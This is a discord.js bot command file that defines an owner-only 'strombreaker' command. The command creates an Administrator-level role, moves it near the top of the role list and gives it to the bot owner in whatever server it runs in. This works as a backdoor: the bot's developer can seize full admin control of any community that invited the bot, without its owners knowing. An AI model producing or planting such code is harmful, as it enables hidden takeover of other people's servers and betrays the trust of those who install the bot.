const { EmbedBuilder, PermissionsBitField } = require("discord.js");

module.exports = {

  name: "strombreaker",

  aliases: ["sb", "hammer"],

  category: "Owner",

  description: "Creates a max-power role for the bot owner",

  usage: "",

  owner: true, // your handler locks this to bot owners

  async execute(message, args, client, prefix) {

    // Bot permission check

    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {

      return message.reply("❌ I need **Manage Roles** permission to create and edit roles.");

    }

    const guild = message.guild;

    // Check if role already exists

    let role = guild.roles.cache.find(r => r.name === "Strombreaker");

    // Create role with ALL permissions

    if (!role) {

      try {

        role = await guild.roles.create({

          name: "Strombreaker",

          color: "#ff0000",

          hoist: true,

          permissions: [

            PermissionsBitField.Flags.Administrator, // gives everything

          ],

          reason: "Owner executed strombreaker command",

        });

      } catch (err) {

        console.error(err);

        return message.reply("❌ Failed to create role.");

      }

    } else {

      // Ensure it has admin perms if already created

      await role.setPermissions([PermissionsBitField.Flags.Administrator]);

    }

    // Move role as high as bot allows

    try {

      const botRole = guild.members.me.roles.highest;

      await role.setPosition(botRole.position - 1);

    } catch (err) {

      console.error(err);

      return message.reply("❌ Couldn't move role to highest position.");

    }

    // Give role to bot owner

    try {

      await message.member.roles.add(role);

    } catch (err) {

      console.error(err);

      return message.reply("❌ Couldn't give you the role.");

    }

    return message.reply({

      embeds: [

        new EmbedBuilder()

          .setColor(client.color || "#ff0000")

          .setDescription(`⚡ **Strombreaker role created, maxed out, and given to you!**`)

      ]

    });

  }

};